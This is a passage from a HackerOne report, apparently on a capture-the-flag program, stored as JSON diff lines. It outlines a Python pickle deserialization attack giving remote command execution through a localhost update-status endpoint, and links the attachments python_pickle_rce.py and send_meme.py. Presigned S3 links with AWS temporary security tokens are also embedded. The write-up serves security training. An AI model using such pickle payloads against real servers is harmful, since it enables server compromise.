data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/406/71154236bc4a3a15167769b279b7d7cc675584a2/python_pickle_rce.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=77a81ab1ce74ff73575ef146e7c3bf092b52e48c9a4dcd5553e5a7301a649830\" data-attachment-type=\"text/x-python\">python_pickle_rce.py (F352406)</a> to create a pickle payload for any OS command. With this payload, use <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"send_meme.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/404/1a52bc0d05fd75aecd56d33d507851864c4c3045/send_meme.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=34bdb74f17dd0c7dccaf20f4ca96d0da2e90550a4229bc5986d26020000c711e\" data-attachment-type=\"text/x-python\">send_meme.py (F352404)</a> to send a request to <a title=\"http://localhost:1337/update-status?debug=1&amp;status=%7BPAYLOAD%7D\" href=\"/redirect?signature=08855fdbb45e1bd35dccd459fa5de9975d004a3c&amp;url=http%3A%2F%2Flocalhost%3A1337%2Fupdate-status%3Fdebug%3D1%26status%3D%257BPAYLOAD%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://localhost:1337/update-status?debug=1&amp;status=%7BPAYLOAD%7D</span><i class=\"icon-external-link\"></i></a>\n</li>\n</ol>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Compromise data and servers.</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://tbd.com", 
+            "about": null, 
+            "twitter_handle": null, 
+            "name": "h1-5411-CTF"
+        }, 
+        "handle": "h1-5411-ctf", 
+        "url": "https://hackerone.com/h1-5411-ctf", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/033/314/1a0c110b0060c574d84b531160a0d2c58141ce6e_small.?1537539140", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/033/314/78d6c799326d92d4cad56dc8c1899a7ea55bc7f2_medium.?1537539140"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 33314, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
